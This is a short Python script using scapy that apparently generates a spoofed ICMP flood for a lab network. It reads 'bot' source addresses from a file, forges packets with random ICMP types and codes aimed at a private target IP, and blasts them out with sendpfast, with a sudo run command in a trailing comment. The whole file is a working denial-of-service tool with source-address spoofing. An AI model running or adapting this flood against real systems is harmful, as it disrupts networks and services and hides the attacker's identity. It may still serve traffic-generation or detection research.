from scapy.all import *
import random
import time
import ipaddress

# ICMP Trash (Random Type/Code)
TARGET_IP = "192.168.100.2"
BOTFILE = "../bots.txt"
NUM_PACKETS = 100

def load_bots(filename):
    bot_ips = []
    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)
    return bot_ips

def run_icmp_random_type_code():
    bot_ips = load_bots(BOTFILE)
    lista_de_pacotes = []
    numero_de_pacotes_enviados = 0


    while True:
        source_ip = random.choice(bot_ips)
        ip_layer = IP(src=source_ip, dst=TARGET_IP)
        eth_layer = Ether()
        icmp_type = random.randint(0, 18)
        icmp_code = random.randint(0, 15)
        icmp_layer = ICMP(type=icmp_type, code=icmp_code)
        packet = eth_layer / ip_layer / icmp_layer
        lista_de_pacotes.append(packet)
        numero_de_pacotes_enviados += 1

        if numero_de_pacotes_enviados == NUM_PACKETS:
            break


    start_time = time.perf_counter()
    sendpfast(lista_de_pacotes, iface="enp0s3", file_cache=True)
    end_time = time.perf_counter()
    duration = end_time - start_time

    print(f"\nSending completed.")
    print(f"Total time to send packets: {duration:.4f} seconds")

if __name__ == "__main__":
    run_icmp_random_type_code()

# Comando: sudo PYTHONPATH=$HOME/scapy python3 icmp_random_type_code_flood.py